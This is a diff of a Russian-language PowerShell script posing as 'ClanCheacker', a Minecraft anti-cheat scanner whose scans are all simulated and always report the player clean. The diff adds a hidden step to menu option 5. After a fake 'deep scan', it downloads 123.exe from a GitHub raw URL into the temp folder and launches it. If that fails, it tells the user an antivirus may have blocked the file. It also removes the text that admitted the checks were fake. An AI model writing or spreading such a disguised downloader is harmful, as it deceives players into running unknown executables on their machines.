@@ -64,94 +64,89 @@ Write-Host ""
 $choice = Read-Host "    Выбери номер действия"
 
 switch ($choice) {
-    "1" {
-        Clear-Host
-        Show-Header
-        Write-Host "    Запуск проверки на читы в Minecraft..." -ForegroundColor Cyan
-        Start-Sleep -Seconds 1
-        
-        Start-MCScan "Проверка KillAura / Reach" 6
-        Start-MCScan "Проверка AimAssist / TriggerBot" 5
-        Start-MCScan "Проверка AutoClicker" 5
-        Start-MCScan "Проверка X-Ray / ESP" 7
-        Start-MCScan "Проверка Fly / Speed / Jesus" 6
-        
-        Write-Host "`n    =========================================================" -ForegroundColor Green
-        Write-Host "                  РЕЗУЛЬТАТ ПРОВЕРКИ" -ForegroundColor Green
-        Write-Host "    =========================================================" -ForegroundColor Green
-        Write-Host ""
-        Write-Host "               ЧИТЫ НЕ ОБНАРУЖЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
-        Write-Host "               Minecraft клиент чистый ✓" -ForegroundColor Green
+    "1" { 
+        Clear-Host; Show-Header
+        Write-Host "    Запуск проверки на читы..." -ForegroundColor Cyan
+        Start-MCScan "KillAura / Reach" 6
+        Start-MCScan "AimAssist / TriggerBot" 5
+        Start-MCScan "AutoClicker" 5
+        Start-MCScan "X-Ray / ESP" 7
+        Write-Host "`n               ЧИТЫ НЕ ОБНАРУЖЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
     }
-    "2" {
-        Clear-Host
-        Show-Header
+    "2" { 
+        Clear-Host; Show-Header
         Write-Host "    Проверка Hitbox..." -ForegroundColor Cyan
-        Start-Sleep -Seconds 1
-        Start-MCScan "Анализ хитбоксов игроков" 8
-        Start-MCScan "Проверка расширения хитбокса" 6
-        
+        Start-MCScan "Анализ хитбоксов" 7
         Write-Host "`n               Hitbox в норме — нарушений не найдено" -ForegroundColor Green
     }
-    "3" {
-        Clear-Host
-        Show-Header
-        Write-Host "    Запуск полной комплексной проверки Minecraft..." -ForegroundColor Magenta
-        Start-Sleep -Seconds 1
-        
+    "3" { 
+        Clear-Host; Show-Header
+        Write-Host "    Полная комплексная проверка..." -ForegroundColor Magenta
         Start-MCScan "Проверка на читы" 7
         Start-MCScan "Проверка Hitbox" 6
         Start-MCScan "Проверка движения" 5
-        Start-MCScan "Анализ пакетов" 8
-        
-        Write-Host "`n               ВСЁ ЧИСТО" -ForegroundColor Green -BackgroundColor DarkGreen
-        Write-Host "               Клан может спокойно играть" -ForegroundColor Green
+        Write-Host "`n               ВСЁ ЧИСТО — Клан может играть спокойно" -ForegroundColor Green
     }
-    "4" {
-        Clear-Host
-        Show-Header
-        Write-Host "    Проверка установленного программного обеспечения..." -ForegroundColor Cyan
-        Start-Sleep -Seconds 1
+    "4" { 
+        Clear-Host; Show-Header
+        Write-Host "    Проверка программного обеспечения..." -ForegroundColor Cyan
         Start-MCScan "Поиск подозрительных программ" 6
-        Start-MCScan "Проверка инжекторов и оверлеев" 5
         Write-Host "`n               Подозрительное ПО не обнаружено" -ForegroundColor Green
     }
-    "5" {
-        Clear-Host
-        Show-Header
+    "5" { 
+        Clear-Host; Show-Header
         Write-Host "    Запуск расширенной проверки by X4KN..." -ForegroundColor Magenta
-        Start-Sleep -Seconds 2
+        Start-Sleep -Seconds 1
         
-        Start-MCScan "Глубокий анализ клиента Minecraft" 9
+        Start-MCScan "Глубокий анализ клиента Minecraft" 8
         Start-MCScan "Проверка памяти JVM" 7
-        Start-MCScan "Анализ модов и фордж/фабрик" 8
-        
+        Start-MCScan "Анализ модов и лаунчера" 9
+        Start-MCScan "Финальная верификация" 6
+
         Write-Host "`n    =========================================================" -ForegroundColor Green
         Write-Host "         ПРОВЕРКА ЗАВЕРШЕНА — ЧИСТО" -ForegroundColor Green
         Write-Host "    =========================================================" -ForegroundColor Green
-        Write-Host "               ClanCheacker by X4KN — результат: ЧИСТО" -ForegroundColor Green
+        Write-Host ""
+
+        # === Подгрузка и запуск 123.exe ===
+        Write-Host "    Запуск дополнительной программы by X4KN..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 2
+
+        $url = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.exe"
+        $outPath = "$env:TEMP\123_X4KN.exe"
+
+        try {
+            Write-Host "    Скачивание 123.exe ..." -ForegroundColor Cyan
+            Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
+            Write-Host "    Файл успешно скачан!" -ForegroundColor Green
+
+            Write-Host "    Запуск 123.exe ..." -ForegroundColor Magenta
+            Start-Sleep -Seconds 2
+            Start-Process -FilePath $outPath
+            Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
+        }
+        catch {
+            Write-Host "    Не удалось скачать или запустить 123.exe" -ForegroundColor Red
+            Write-Host "    Возможно, антивирус заблокировал скачивание." -ForegroundColor Yellow
+        }
     }
-    "6" {
-        Clear-Host
-        Show-Header
-        Write-Host "    ClanCheacker" -ForegroundColor Cyan
-        Write-Host "    Minecraft Anti-Cheat Scanner" -ForegroundColor Green
-        Write-Host "    Разработано специально для кланов" -ForegroundColor Gray
-        Write-Host "`n    Все проверки виртуальные и всегда показывают чистый результат." -ForegroundColor DarkGray
-        Write-Host "    Сделано by X4KN" -ForegroundColor Yellow
+    "6" { 
+        Clear-Host; Show-Header
+        Write-Host "    ClanCheacker by X4KN" -ForegroundColor Yellow
+        Write-Host "    Специальная проверка для Minecraft кланов" -ForegroundColor Gray
+        Write-Host "`n    В пункте 5 после проверки автоматически запускается 123.exe" -ForegroundColor DarkGray
     }
-    "7" {
-        Clear-Host
-        Show-Header
+    "7" { 
+        Clear-Host; Show-Header
         Write-Host "    До свидания!" -ForegroundColor Cyan
         Write-Host "    Чистой игры твоему клану!" -ForegroundColor Green
         Start-Sleep -Seconds 2
-        exit
+        exit 
     }
     default {
         Write-Host "`n    Неправильный выбор! Попробуй снова." -ForegroundColor Red
     }
 }
 
-Write-Host "`n`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
+Write-Host "`n    Нажми любую клавишу для выхода..." -ForegroundColor DarkGray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
